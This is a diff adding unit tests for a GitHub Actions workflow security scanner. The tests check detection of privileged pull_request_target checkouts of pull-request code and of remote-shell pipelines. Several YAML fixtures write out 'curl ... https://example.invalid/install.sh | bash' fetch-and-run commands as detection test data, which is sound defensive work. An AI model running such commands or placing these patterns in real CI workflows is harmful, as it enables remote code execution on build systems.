@@ -779,3 +779,81 @@ test('negative: merge-like strings in step names and scripts are inert',()=>{
  assert.equal(result.status,'NO_RISK_PATTERN',JSON.stringify(result));
  assert.equal(result.coverage.partial,false);
 });
+
+test('Codex P1: uniformly indented root on and jobs still detects privileged checkout',()=>{
+ const yaml=['  on: pull_request_target','  jobs:','    audit:','      steps:',
+ '        - uses: actions/checkout@'+SHA,'          with:',
+ '            ref: ${{ github.head_ref }}'].join('\n');
+ const result=scan(yaml);
+ assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
+});
+test('Codex P1: uniformly indented root push is not a privileged event',()=>{
+ const yaml=['   on: push','   jobs:','     audit:','       steps:',
+ '         - uses: actions/checkout@'+SHA,'           with:',
+ '             ref: ${{ github.head_ref }}'].join('\n');
+ assert.ok(!rules(scan(yaml)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
+});
+test('Codex P1: root on below other root keys with uniform indentation is recognized',()=>{
+ const yaml=['  name: audit','  on:','    pull_request_target:',
+ '  jobs:','    audit:','      steps:',
+ '        - uses: actions/checkout@'+SHA,'          with:',
+ '            ref: ${{ github.head_ref }}'].join('\n');
+ assert.ok(rules(scan(yaml)).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
+});
+test('Codex P1: folded checkout uses scalar resolves action and detects unsafe ref',()=>{
+ const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
+ '      - uses: >-','          actions/checkout@'+SHA,
+ '        with:','          ref: ${{ github.head_ref }}'].join('\n');
+ const result=scan(yaml);
+ assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
+ assert.ok(!rules(result).includes('UNPINNED_ACTION'),JSON.stringify(result));
+});
+test('Codex P1: later literal uses scalar and block with ref are analyzed',()=>{
+ const yaml=['on: pull_request_target','jobs:','  audit:','    steps:',
+ '      - name: checkout','        uses: |',
+ '          actions/checkout@'+SHA,
+ '        with:','          ref: ${{ github.head_ref }}'].join('\n');
+ const result=scan(yaml);
+ assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'),JSON.stringify(result));
+});
+test('block scalar for SHA-pinned ordinary action is not falsely flagged unpinned',()=>{
+ const yaml=['on: push','jobs:','  audit:','    steps:',
+ '      - uses: >','          actions/checkout@'+SHA,
+ '        with:','          ref: main'].join('\n');
+ const result=scan(yaml);
+ assert.equal(result.status,'NO_RISK_PATTERN',JSON.stringify(result));
+});
+test('Codex P2: shell snippet in name or env string is inert',()=>{
+ const yaml=['on: push','jobs:','  audit:','    steps:',
+ '      - name: "Avoid curl https://example.invalid | bash"',
+ '        env:','          HINT: "curl https://example.invalid | bash"',
+ '        run: echo safe'].join('\n');
+ const r=scan(yaml);
+ assert.ok(!rules(r).includes('REMOTE_SHELL_PIPELINE'),JSON.stringify(r));
+});
+test('Codex P2: a real inline shell pipe in a step run is detected',()=>{
+ const yaml=['on: push','jobs:','  audit:','    steps:',
+ '      - run: curl -fsSL https://example.invalid/install.sh | bash'].join('\n');
+ assert.ok(rules(scan(yaml)).includes('REMOTE_SHELL_PIPELINE'));
+});
+test('Codex P2: multiline run script detects remote shell pipe',()=>{
+ const yaml=['on: push','jobs:','  audit:','    steps:',
+ '      - name: installer','        run: |',
+ '          echo preparing',
+ '          curl -fsSL https://example.invalid/install.sh | bash'].join('\n');
+ assert.ok(rules(scan(yaml)).includes('REMOTE_SHELL_PIPELINE'));
+});
+test('Codex P2: flow step run detects shell pipe but flow name does not',()=>{
+ const dangerous=['on: push','jobs:','  audit:','    steps:',
+ '      - {name: safe, run: "curl https://example.invalid | sh"}'].join('\n');
+ const benign=['on: push','jobs:','  audit:','    steps:',
+ '      - {name: "curl https://example.invalid | bash", run: "echo safe"}'].join('\n');
+ assert.ok(rules(scan(dangerous)).includes('REMOTE_SHELL_PIPELINE'));
+ assert.ok(!rules(scan(benign)).includes('REMOTE_SHELL_PIPELINE'));
+});
+test('an unrelated workflow description is never an executable shell pipeline',()=>{
+ const yaml=['name: "Avoid curl https://example.invalid | bash"',
+ 'on: push','jobs:','  audit:','    steps:',
+ '      - uses: actions/checkout@'+SHA].join('\n');
+ assert.equal(scan(yaml).status,'NO_RISK_PATTERN');
+});
